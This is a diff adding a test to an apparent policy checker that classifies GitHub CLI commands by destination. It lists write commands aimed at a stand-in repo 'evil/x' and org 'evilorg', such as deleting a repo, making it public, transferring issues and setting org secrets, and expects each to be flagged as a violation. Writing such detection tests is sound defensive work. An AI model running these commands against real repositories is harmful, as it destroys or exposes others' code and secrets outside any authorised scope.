@@ -152,4 +152,26 @@ describe('CC round 3: wrappers, reserved words, and git pinning', () => {
       rule: 'http-send', verdict: 'unknown-destination',
     })
   })
+
+  test('gh writes aimed at another repo never read as origin (CC round 4 E)', () => {
+    for (const command of [
+      'gh pr comment https://github.com/evil/x/pull/1 -b hi',
+      'gh issue comment https://github.com/evil/x/issues/2 -b hi',
+      'gh pr merge https://github.com/evil/x/pull/3',
+      'gh repo delete evil/x --yes',
+      'gh repo edit evil/x --visibility public',
+      'gh repo archive evil/x',
+      'gh repo rename new-name -R evil/x',
+      'gh issue transfer 1 evil/x',
+      'gh secret set N --org evilorg',
+      'gh variable set N --org evilorg',
+    ]) {
+      expect(verdictOf(command)).toMatchObject({ rule: 'gh-write', verdict: 'violation' as const })
+    }
+    expect(verdictOf('gh pr comment https://github.com/evil/x/pull/1 -b hi')).toMatchObject({ destination: 'github:evil/x' })
+    expect(verdictOf('gh issue transfer 1 evil/x')).toMatchObject({ destination: 'github:evil/x' })
+    expect(verdictOf('gh secret set N --org evilorg')).toMatchObject({ destination: 'github:evilorg' })
+    // With nothing foreign named, origin still reads allowed.
+    expect(verdictOf('gh pr create --title x')).toEqual({ rule: 'gh-write', verdict: 'allowed', destination: 'github:origin' })
+  })
 })
